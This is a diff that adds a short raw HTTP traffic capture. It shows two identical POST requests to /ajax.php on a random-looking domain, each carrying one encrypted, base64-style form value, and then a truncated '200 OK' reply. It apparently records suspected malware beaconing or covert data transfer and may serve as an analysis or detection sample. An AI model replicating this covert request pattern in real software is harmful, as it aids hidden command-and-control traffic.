@@ -1,0 +1,14 @@
+POST /ajax.php HTTP/1.1
+Host: 897234kjdsf4523234.com
+Content-Length: 217
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Connection: close
+
+9f94ee2e06c3cb29=hYwes30mWYzsZybnLU3s%2FkP8WNDuNOxpE9liK3AgvrUKva8gMEVVyhMXAmbYp7Cs%0D%0AR3Y1YR1dYPJiHOJ5g1UQkDLySI9fPFU5mY7lSRbDoX8kCS9%2ByU4SqHNgBFPJO9RY%0D%0Aw7TBPSpvqM9BR%2BErcIWvJ1bY8g%2BHqmCqoEdJGhiDPIA%3D%0D%0APOST /ajax.php HTTP/1.1
+Host: 897234kjdsf4523234.com
+Content-Length: 217
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Connection: close
+
+9f94ee2e06c3cb29=hYwes30mWYzsZybnLU3s%2FkP8WNDuNOxpE9liK3AgvrUKva8gMEVVyhMXAmbYp7Cs%0D%0AR3Y1YR1dYPJiHOJ5g1UQkDLySI9fPFU5mY7lSRbDoX8kCS9%2ByU4SqHNgBFPJO9RY%0D%0Aw7TBPSpvqM9BR%2BErcIWvJ1bY8g%2BHqmCqoEdJGhiDPIA%3D%0D%0AHTTP/1.1 200 OK
+Server: ngi
